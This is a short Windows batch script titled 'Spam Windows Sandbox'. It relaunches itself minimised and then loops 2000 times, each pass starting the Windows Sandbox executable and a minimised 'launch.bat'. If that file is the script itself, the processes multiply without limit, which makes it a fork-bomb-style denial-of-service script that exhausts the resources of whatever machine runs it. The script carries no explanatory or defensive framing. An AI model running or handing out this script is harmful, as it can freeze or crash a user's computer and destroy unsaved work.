:: Spam Windows Sandbox
@echo off
if not "%1" == "min" start /MIN cmd /c %0 min & exit 0 >nul 2>&1
FOR /L %%A IN (1,1,2000) DO (
start "C:\Windows\System32\WindowsSandbox.exe"
start /MIN "" ".\launch.bat"
)
